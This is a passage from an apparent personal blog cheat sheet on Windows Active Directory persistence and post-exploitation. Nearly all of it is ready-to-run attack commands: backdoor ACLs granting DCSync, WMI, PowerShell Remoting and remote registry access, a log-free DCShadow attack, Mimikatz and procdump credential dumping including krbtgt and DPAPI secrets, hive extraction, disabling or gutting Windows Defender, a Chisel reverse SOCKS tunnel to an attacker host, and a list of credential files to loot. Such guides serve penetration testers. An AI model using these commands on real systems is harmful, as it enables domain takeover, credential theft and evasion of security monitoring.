</span></span></code></pre></div><h3 id=grant-specific-user-dcsync-rights-with-powerview>Grant specific user DCSync rights with PowerView</h3><p>Gives a user of your choosing the rights to DCSync at any time. May evade detection in some setups.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Add-ObjectACL</span> -TargetDistinguishedName <span style=color:#ed9d13>&#34;dc=targetdomain,dc=com&#34;</span> -PrincipalSamAccountName BackdoorUser -Rights DCSync
</span></span></code></pre></div><h3 id=domain-controller-dsrm-admin>Domain Controller DSRM admin</h3><p>The DSRM admin is the local administrator account of the DC. Remote logon needs to be enabled first.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>New-ItemProperty</span> <span style=color:#ed9d13>&#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34;</span> -Name <span style=color:#ed9d13>&#34;DsrmAdminLogonBehavior&#34;</span> -Value <span style=color:#3677a9>2</span> -PropertyType DWORD
</span></span></code></pre></div><p>Now we can login remotely using the local admin hash dumped on the DC before (with <code>lsadump::sam</code>, see <a href=#dumping-secrets-with-mimikatz>&lsquo;Dumping secrets with Mimikatz&rsquo;</a> below). Use e.g. &lsquo;overpass-the-hash&rsquo; to get a session (see <a href=#mimikatz>&lsquo;Mimikatz&rsquo;</a> above).</p><h3 id=modifying-security-descriptors-for-remote-wmi-access>Modifying security descriptors for remote WMI access</h3><p>Give user WMI access to a machine, using <a href=https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1>Set-RemoteWMI</a> cmdlet from Nishang. Can be run to persist access to e.g. DCs.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Set-RemoteWMI</span> -UserName BackdoorUser -ComputerName dc.targetdomain.com -namespace <span style=color:#ed9d13>&#39;root\cimv2&#39;</span>
</span></span></code></pre></div><p>For execution, see <a href=#command-execution-with-wmi>&lsquo;Command execution with WMI&rsquo;</a> above.</p><h3 id=modifying-security-descriptors-for-powershell-remoting-access>Modifying security descriptors for PowerShell Remoting access</h3><p>Give user PowerShell Remoting access to a machine, using <a href=https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1>Set-RemotePSRemoting.ps1</a> cmdlet from Nishang. Can be run to persist access to e.g. DCs.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Set-RemotePSRemoting</span> -UserName BackdoorUser -ComputerName dc.targetdomain.com
</span></span></code></pre></div><p>For execution, see <a href=#command-executin-with-powershell-remoting>&lsquo;Command execution with PowerShell Remoting&rsquo;</a> above.</p><h3 id=modifying-dc-registry-security-descriptors-for-remote-hash-retrieval-using-damp>Modifying DC registry security descriptors for remote hash retrieval using DAMP</h3><p>Using <a href=https://github.com/HarmJ0y/DAMP>DAMP toolkit</a>, we can backdoor the DC registry to give us access on the <code>SAM</code>, <code>SYSTEM</code>, and <code>SECURITY</code> registry hives. This allows us to remotely dump DC secrets (hashes).</p><p>We add the backdoor using the <code>Add-RemoteRegBackdoor.ps1</code> cmdlet from DAMP.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Add-RemoteRegBackdoor</span> -ComputerName dc.targetdomain.com -Trustee BackdoorUser
</span></span></code></pre></div><p>Dump secrets remotely using the <code>RemoteHashRetrieval.ps1</code> cmdlet from DAMP (run as &lsquo;BackdoorUser&rsquo; user).</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Get machine account hash for silver ticket attack</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-RemoteMachineAccountHash</span> -ComputerName DC01
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get local account hashes</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-RemoteLocalAccountHash</span> -ComputerName DC01
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get cached credentials (if any)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-RemoteCachedCredential</span> -ComputerName DC01
</span></span></code></pre></div><h3 id=dcshadow>DCShadow</h3><p>DCShadow is an attack that masks certain actions by temporarily imitating a Domain Controller. If you have Domain Admin or Enterprise Admin privileges in a root domain, it can be used for forest-level persistence.</p><p>Optionally, as Domain Admin, give a chosen user the privileges required for the DCShadow attack (uses <code>Set-DCShadowPermissions.ps1</code> cmdlet).</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Set-DCShadowPermissions</span> -FakeDC BackdoorMachine -SamAccountName TargetUser -Username BackdoorUser -Verbose
</span></span></code></pre></div><p>Then, from any machine, use Mimikatz to stage the DCShadow attack.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Set SPN for user
</span></span><span style=display:flex><span>lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:&#34;SuperHacker/ServicePrincipalThingey&#34;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Set SID History for user (effectively granting them Enterprise Admin rights)
</span></span><span style=display:flex><span>lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Set Full Control permissions on AdminSDHolder container for user
</span></span><span style=display:flex><span>## Requires retrieval of current ACL:
</span></span><span style=display:flex><span>(New-Object System.DirectoryServices.DirectoryEntry(&#34;LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com&#34;)).psbase.ObjectSecurity.sddl
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>## Then get target user SID:
</span></span><span style=display:flex><span>Get-NetUser -UserName BackdoorUser | select objectsid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
</span></span><span style=display:flex><span>lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-1874506631-3219952063-538504511-45109]])
</span></span></code></pre></div><p>Finally, from either a DA session OR a session as the user provided with the DCShadow permissions before, run the DCShadow attack. Actions staged previously will be performed without leaving any logs ðŸ˜ˆ</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>lsadump::dcshadow /push
</span></span></code></pre></div><h2 id=post-exploitation>Post-Exploitation</h2><h3 id=lsass-protection>LSASS protection</h3><p>Sometimes, LSASS is configured to run as a protected process (PPL). You can query this with PowerShell as follows.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-ItemProperty</span> -Path HKLM<span style=color:#a61717;background-color:#e3d2d2>:</span>\SYSTEM\CurrentControlSet\Control\Lsa -Name <span style=color:#ed9d13>&#34;RunAsPPL&#34;</span> 
</span></span></code></pre></div><p>If this is the case, you can&rsquo;t just dump or parse LSASS, and you need to disable the protection with something like <code>mimidrv.sys</code>. I won&rsquo;t discuss how to do that here, but there are tools such as <a href=https://github.com/itm4n/PPLdump>PPLDump</a> available to help.</p><h3 id=dumping-os-credentials-with-mimikatz>Dumping OS credentials with Mimikatz</h3><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Dump logon passwords
</span></span><span style=display:flex><span>sekurlsa::logonpasswords
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Dump all domain hashes from a DC
</span></span><span style=display:flex><span>## Note: Everything with /patch is noisy as heck since it writes to LSASS ðŸš©
</span></span><span style=display:flex><span>lsadump::lsa /patch
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Dump only local users
</span></span><span style=display:flex><span>lsadump::sam
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># DCSync (requires &#39;ldap&#39; SPN)
</span></span><span style=display:flex><span>lsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Dump Windows secrets, such as stored creds for scheduled tasks (elevate first) ðŸš©
</span></span><span style=display:flex><span>vault::list
</span></span><span style=display:flex><span>vault::cred /patch
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Dump Kerberos encryption keys, including the AES256 key for better opsec (see &#39;Lateral Movement with Rubeus&#39; section) 
</span></span><span style=display:flex><span>sekurlsa::ekeys
</span></span></code></pre></div><h3 id=abusing-the-data-protection-api-dpapi-with-mimikatz>Abusing the Data Protection API (DPAPI) with Mimikatz</h3><p>Mimikatz has quite some functionality to access Windows&rsquo; DPAPI, which is used to encrypt many credentials, including e.g. browser passwords.</p><p>Note that Mimikatz will automatically cache the master keys that it has seen (check cache with <code>dpapi::cache</code>), but this does <em>NOT</em> work if no Mimikatz session is persisted (e.g. in Cobalt Strike or when using <code>Invoke-Mimikatz</code>). More information on using Mimikatz for DPAPI is available <a href=https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials>here</a>.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Find the IDs of protected secrets for a specific user
</span></span><span style=display:flex><span>dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Get information, including the used master key ID, from a specific secret (take the path from above)
</span></span><span style=display:flex><span>dpapi::cred /in:C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># IF YOU ARE PRIVILEGED
</span></span><span style=display:flex><span># Dump all master keys from the current system
</span></span><span style=display:flex><span>sekurlsa::dpapi
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># IF YOU ARE NOT PRIVILEGED (session as target user required)
</span></span><span style=display:flex><span># Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)
</span></span><span style=display:flex><span>dpapi::masterkey /rpc /in:C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1124\dd89dddf-946b-4a80-9fd3-7f03ebd41ff4
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Decrypt the secret using the retrieved master key
</span></span><span style=display:flex><span># Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)
</span></span><span style=display:flex><span>dpapi::cred /in:C:\Users\[USERNAME]]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f318ad
</span></span></code></pre></div><h3 id=dumping-secrets-without-mimikatz>Dumping secrets without Mimikatz</h3><p>We can also parse system secrets without using Mimikatz on the target system directly.</p><h4 id=dumping-lsass>Dumping LSASS</h4><p>The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target. <a href=https://github.com/outflanknl/Dumpert>Dumpert</a>, <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>Procdump</a>, or other (custom) tooling can be used to dump LSASS memory.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly</span>
</span></span><span style=display:flex><span>.\procdump.exe -r -ma lsass.exe lsass.dmp
</span></span></code></pre></div><p>After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to &lsquo;Minidump&rsquo; mode to parse the file as follows. After this, we can run Mimikatz&rsquo; credential retrieval commands as usual.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>sekurlsa::minidump lsass.dmp
</span></span></code></pre></div><h4 id=dumping-secrets-from-the-registry>Dumping secrets from the registry</h4><p>We can dump secrets from the registry and parse the files &ldquo;offline&rdquo; to get a list of system secrets. ðŸš©</p><p>On the target, we run the following:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>reg.exe save hklm\sam c:\users\public\downloads\sam.save
</span></span><span style=display:flex><span>reg.exe save hklm\system c:\users\public\downloads\system.save
</span></span><span style=display:flex><span>reg.exe save hklm\security c:\users\public\downloads\security.save
</span></span></code></pre></div><p>Then on our attacking box we can dump the secrets with Impacket:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out
</span></span></code></pre></div><h4 id=dumping-secrets-from-a-volume-shadow-copy>Dumping secrets from a Volume Shadow Copy</h4><p>We can also create a &ldquo;Volume Shadow Copy&rdquo; of the <code>SAM</code> and <code>SYSTEM</code> files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wmic shadowcopy call create Volume=<span style=color:#ed9d13>&#39;C:\&#39;</span>
</span></span><span style=display:flex><span><span style=color:#24909d>copy </span>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\public\sam.save
</span></span><span style=display:flex><span><span style=color:#24909d>copy </span>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\public\system.save
</span></span></code></pre></div><h3 id=windows-defender-evasion>Windows Defender evasion</h3><p><em>Note: All below commands require administrative privileges on the system!</em></p><p>You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-MpPreference</span> | <span style=color:#24909d>select-object</span> -ExpandProperty ExclusionPath
</span></span></code></pre></div><p>Alternatively, you could add an exclusion directory for your shady stuff. ðŸ‘€</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Add-MpPreference</span> -ExclusionPath <span style=color:#ed9d13>&#34;C:\Users\Public\Downloads\SuperLegitDownloadDirectory&#34;</span>
</span></span></code></pre></div><p>If you&rsquo;re more aggro, you can disable Defender entirely. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. ðŸš©</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Disable realtime monitoring altogether</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Set-MpPreference</span> -DisableRealtimeMonitoring $true
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Only disables scanning for downloaded files or attachments</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Set-MpPreference</span> -DisableIOAVProtection $true
</span></span></code></pre></div><p>As an alternative to disabling Defender, you can leave it enabled and just remove all virus signatures from it.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#ed9d13>&#34;C:\Program Files\Windows Defender\MpCmdRun.exe&#34;</span> -RemoveDefinitions -All
</span></span></code></pre></div><h3 id=chisel-proxying>Chisel proxying</h3><p>If you need to proxy traffic over a compromised Windows machine, <a href=https://github.com/jpillora/chisel>Chisel</a> (or <a href=https://github.com/shantanu561993/SharpChisel>SharpChisel</a>) is a good choice. Chisel allows port forwarding, but my favorite technique is setting up a reverse SOCKS proxy on the target machine, allowing you to tunnel any traffic over the target system.</p><p>On our attacking machine (Linux in this case), we start a Chisel server on port 80 in reverse SOCKS5 mode.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo ./chisel server -p <span style=color:#3677a9>80</span> --reverse --socks5
</span></span></code></pre></div><p>Then, on our compromised target system, we connect to this server and tell it to proxy all traffic over it via the reverse SOCKS5 tunnel.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\chisel.exe client <span style=color:#3677a9>192.168</span>.49.<span style=color:#3677a9>67</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#3677a9>80</span> R:socks
</span></span></code></pre></div><p>A proxy is now open on port 1080 of our linux machine. We can now use e.g. ProxyChains to tunnel over the target system.</p><h3 id=juicy-files>Juicy files</h3><p>There are lots of files that may contain interesting information. Tools like <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS>WinPEAS</a> or collections like <a href=https://github.com/PowerShellMafia/PowerSploit>PowerSploit</a> may help in identifying juicy files (for privesc or post-exploitation).</p><p>Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.</p><blockquote><p>In addition, don&rsquo;t forget to enumerate any local databases with <code>sqlcmd</code> or <code>Invoke-SqlCmd</code>!</p></blockquote><pre tabindex=0><code># All user folders
## Limit this command if there are too many files ;)
tree /f /a C:\Users

# Web.config
C:\inetpub\www\*\web.config

# Unattend files
C:\Windows\Panther\Unattend.xml

# RDP config files
C:\ProgramData\Configs\

# Powershell scripts/config files
C:\Program Files\Windows PowerShell\

# PuTTy config
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty

# FileZilla creds
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml

# Jenkins creds (also check out the Windows vault, see above)
C:\Program Files\Jenkins\credentials.xml

# WLAN profiles
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml

# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name &#34;Password&#34; | select -ExpandProperty Password
</code></pre></div></article><hr><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
<span class=tag><a href=https://casvancooten.com/pr-preview/pr-2/tags/active-directory/>Active Directory</a></span>
<span class=tag><a href=https://casvancooten.com/pr-preview/pr-2/tags/windows/>Windows</a></span>
<span class=tag><a href=https://casvancooten.com/pr-preview/pr-2/tags/hacking/>Hacking</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
6475 Words</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
04-11-2020
(Last updated: 10-08-2023)</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"/><line x1="1.05" y1="12" x2="7" y2="12"/><line x1="17.01" y1="12" x2="22.96" y2="12"/></svg>
<a href=https://github.com/chvancooten/chvancooten.github.io/commit/694a0010ff07d9d9811e1065b60b3729a5bdf5fc target=_blank rel=noopener>694a001</a>
@ 10-08-2023</p></div><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=https://casvancooten.com/pr-preview/pr-2/posts/2021/03/getting-the-osep-certification-evasion-techniques-and-breaching-defenses-pen-300-course-review/><span class=button__icon>â†</span>
<span class=button__text>Getting the OSEP Certification: 'Evasion Techniques and Breaching Defenses' (PEN-300) Course Review</span>
</a></span><span class="button next"><a href=https://casvancooten.com/pr-preview/pr-2/posts/2020/10/getting-the-crtp-certification-attacking-and-defending-active-directory-course-review/><span class=button__text>Getting the CRTP Certification: 'Attacking and Defending Active Directory' Course Review</span>
<span class=button__icon>â†’</span></a></span></div></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
<span><a href=https://casvancooten.com/pr-preview/pr-2/posts/index.xml target=_blank title=rss><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span><a href=http://gohugo.io>Hugo</a> theme by <a href=https://github.com/rhazdon>rhazdon</a></span></div></div></footer></div><script type=text/javascript src=/pr-preview/pr-2/bundle.min.fcdbd434c2246625085552a35f7f1945ee33873b87ad089a5d75bb128e7bc92319bc4cf5cf5e9e6683f0710d0a245f08c96f5e0238da7f43ff91975fc78fb07a.js integrity="sha512-/NvUNMIkZiUIVVKjX38ZRe4zhzuHrQiaXXW7Eo57ySMZvEz1z16eZoPwcQ0KJF8IyW9eAjjaf0P/kZdfx4+weg=="></script></body></html>